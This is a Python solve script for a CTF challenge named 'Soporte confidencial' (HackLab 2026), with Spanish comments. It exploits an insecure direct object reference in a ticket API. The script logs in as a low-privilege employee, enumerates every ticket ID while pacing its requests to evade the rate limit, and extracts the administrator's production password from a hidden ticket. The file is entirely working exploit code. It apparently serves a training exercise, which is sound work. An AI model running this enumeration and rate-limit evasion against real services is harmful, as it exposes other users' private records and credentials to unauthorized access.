#!/usr/bin/env python3
"""
Desafío 52 - Soporte confidencial (HackLab 2026)
Explota el IDOR de GET /api/v1/tickets/{id} enumerando todos los tickets
con el token de 'empleado'. El ticket del Administrador (user_id 1) está
escondido entre los tickets de relleno y contiene la credencial de producción.

Uso: python solve.py
"""
import base64
import hashlib
import json
import time
import urllib.request

BASE = "https://sop-conf.shared.softwareseguro.com.ar"


def login(username, password):
    body = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        f"{BASE}/api/v1/login",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())["token"]


def get_ticket(token, ticket_id):
    req = urllib.request.Request(
        f"{BASE}/api/v1/tickets/{ticket_id}",
        headers={"Authorization": f"Bearer {token}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def main():
    token = login("empleado", "1234")
    # El JWT (HS256) solo expone user_id=10; el listado /tickets filtra por él.
    # Pero el detalle /tickets/{id} NO valida ownership -> IDOR.
    print("[*] token obtenido, enumerando tickets...")
    for tid in range(1, 103):
        while True:
            status, data = get_ticket(token, tid)
            if status == 429:          # rate limit: 60 s de cooldown
                time.sleep(65)
                continue
            break
        if status == 200 and data.get("user_id") == 1:
            desc = data["description"]
            print(f"[+] Ticket del admin (id={tid}): {data['title']}")
            print(f"    {desc}")
            # la contraseña es el último token del texto
            password = desc.split("Es:")[-1].strip()
            md5 = hashlib.md5(password.encode()).hexdigest()
            print(f"[+] Password : {password}")
            print(f"[+] MD5 (flag): {md5}")
            return
        time.sleep(12)                 # espaciar para no gatillar el rate limit
    print("[-] No se encontró el ticket del admin")


if __name__ == "__main__":
    main()
